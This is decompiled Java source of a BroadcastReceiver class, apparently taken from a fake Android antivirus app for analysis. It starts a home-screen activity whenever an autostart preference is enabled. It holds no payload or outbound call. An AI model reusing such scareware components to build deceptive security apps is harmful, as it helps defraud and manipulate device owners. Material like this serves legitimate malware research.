package com.worker.androiddefender2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.example.androiddefender2.DefenderApplication;

public class ServiceStarter extends BroadcastReceiver {
  public void onReceive(Context paramContext, Intent paramIntent) {
    Context context = DefenderApplication.getInstance().getApplicationContext();
    DefenderApplication.getInstance();
    if (context.getSharedPreferences(DefenderApplication.APP_PREF, 0).getBoolean("chkAutostart", false)) {
      Intent intent = new Intent("android.intent.action.MAIN");
      intent.addCategory("android.intent.category.HOME");
      intent.setFlags(268435456);
      paramContext.startActivity(intent);
    } 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/ServiceStarter.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */